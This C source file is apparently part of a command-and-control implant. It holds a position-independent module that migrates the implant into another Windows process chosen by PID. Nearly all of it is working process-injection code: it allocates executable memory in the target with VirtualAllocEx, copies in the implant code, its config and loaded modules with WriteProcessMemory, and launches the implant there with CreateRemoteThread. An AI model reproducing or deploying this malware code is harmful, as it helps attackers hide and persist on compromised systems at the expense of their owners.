/*
PIC module to be sent as stripped binary code to the implant, then added to its modules struct.
Used to migrate the implant from the current process to another selected process
*/

#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "../shared/64BitHelper.h"
#include "../shared/Config.h"


// Given generic name "ModuleEntry" for reuse of Post-Build CLI command which extract the PIC binary
/*
* @brief Allocates memory within a target process and moves necessary Config data from
* the current process to the new process. Then shutdown the implant in the current process
* and initiates it in the new process.
* @param [in] Config network context, dynamic imports, and runtime data
* @param [in] Message Pointer to message containing AddModule command data
* @return true on success / false on failure
*/
bool ModuleEntry(PCONFIG Config, PMESSAGE Message)
{
	/* Things to migrate:
	* [X] ImplantPIC
	* [X] Config Struct
	* [-] Imports struct (just need alloc'ed space, will be relinked)
	* [X] Modules struct
	*
	* Virtual Allocs:
    * 1. migrationCode
    * |-- Implant code
	* 2. migrationData
	* |-- Config
	* |-- Imports
	* |-- Modules
	* X. moduleXCode
	* ...
	*/
    // check GetFile has a message with contents/value
    if (Message->Length < sizeof(uint32_t))
    {
        return false;
    }

    unsigned pid = (unsigned) *((uint32_t *)(Message->Value));
	//DBGPRINT(Config->Imports->DbgPrint("Migration PID: %u\n", pid));

	HANDLE hProcess = Config->Imports->OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid);
    if (!hProcess)
    {
        return false;
    }

    // ImplantPIC code migration to new process: allocate enough memory, then copy existing PIC code into memory
	uint8_t * migrationCode = Config->Imports->VirtualAllocEx(hProcess, NULL, Config->ImplantSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!migrationCode)
    {
        //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to allocate virtual memory for code in remote process PID: %u\n", pid);
        return false;
    }
    if (!Config->Imports->WriteProcessMemory(hProcess, migrationCode, Config->ImplantEntry, Config->ImplantSize, NULL))
    {
        //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to write implant code to new process memory. Error: %u\n", GetLastError());
        return false;
    }

    // ImplantPIC data (Config) migration to new process: allocate enough memory, then copy existing Config data, Module pointers, and Modules into memory
	uint8_t * migrationData = Config->Imports->VirtualAllocEx(hProcess, NULL, sizeof(CONFIG) + sizeof(IMPORTS) + sizeof(MODULES), MEM_COMMIT, PAGE_READWRITE);
    if (!migrationData)
    {
        //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to allocate virtual memory for data in remote process PID: %u\n", pid);
        return false;
    }
    // create a temporary newConfig and newModules to hold new process data
    CONFIG newConfig = *Config;
    MODULES newModules;
    SecureZeroMemory(&newModules, sizeof(MODULES));
    newConfig.ImplantEntry = migrationCode;
    newConfig.Imports = NULL;
    newConfig.Modules = (PMODULES) (migrationData + sizeof(CONFIG) + sizeof(IMPORTS));

    // Alloc space and copy all loaded module code into the new process
    for (int idx = 0; idx < sizeof(MODULES); idx += sizeof(void(*)()))
    {
        uint8_t ** modulesPtr = (uint8_t **) ((uint8_t *)Config->Modules + idx);
        uint8_t ** newModulesPtr = (uint8_t **) ((uint8_t *)&newModules + idx);
        uint8_t * module = *(modulesPtr);
        if (!module)
        {
            continue;
        }
        MEMORY_BASIC_INFORMATION moduleMbi;
        if (!Config->Imports->VirtualQuery((LPCVOID) module, &moduleMbi, sizeof(moduleMbi))) {
            //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to query virtual page of module\n");
            return false;
        }
        uint8_t * newModule = Config->Imports->VirtualAllocEx(hProcess, NULL, moduleMbi.RegionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!newModule)
        {
            //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to allocate virtual memory for code in remote process PID: %u\n", pid);
            return false;
        }
        // copy module code to new process alloc'd memory
        if(!Config->Imports->WriteProcessMemory(hProcess, newModule, module, moduleMbi.RegionSize, NULL))
        {
            //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to write implant code to new process memory.\n");
            return false;
        }

        // save pointer to new module in new Modules struct
        *newModulesPtr = newModule;
    }

    // copy newConfig and newModules into the migration process
    if (!Config->Imports->WriteProcessMemory(hProcess, migrationData, &newConfig, sizeof(CONFIG), NULL))
    {
        //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to write Config struct to new process memory.\n");
        return false;
    }

    if (!Config->Imports->WriteProcessMemory(hProcess, migrationData + sizeof(CONFIG) + sizeof(IMPORTS), &newModules, sizeof(MODULES), NULL))
    {
        //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to write Config struct to new process memory.\n");
        return false;
    }

    if (!Config->Imports->CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)migrationCode, (void*)migrationData, 0, NULL))
    {
        //DBGPRINT(Config->Imports->DbgPrint, "(Migrate) Failed to start new thread in migration process.\n");
        return false;
    }

	return true;
}
